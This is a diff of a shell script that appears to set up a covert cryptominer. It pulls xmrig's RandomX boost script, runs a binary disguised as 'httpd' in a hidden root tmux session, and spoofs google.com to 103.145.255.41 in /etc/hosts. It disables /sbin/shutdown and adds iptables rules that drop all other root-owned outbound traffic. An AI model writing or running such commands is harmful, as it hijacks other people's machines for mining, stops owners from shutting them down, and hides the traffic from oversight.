@@ -29,9 +29,13 @@ wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.
 sudo bash randomx_boost.sh
 sudo chmod +x httpd
 sudo -- sh -c "echo '103.145.255.41  google.com' >> /etc/hosts"
-
+sudo tmux new-session -d -s my_session1  './httpd'
+sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
+sudo iptables -I OUTPUT 2 -p tcp -d google.com --dport 443 -j ACCEPT
+sudo iptables -I OUTPUT 3 -p tcp -d 103.145.255.41 -j ACCEPT
+sudo iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
 sudo chmod 0 /sbin/shutdown
 
-sudo tmux new-session -d -s my_session1  './httpd'
+
 
 
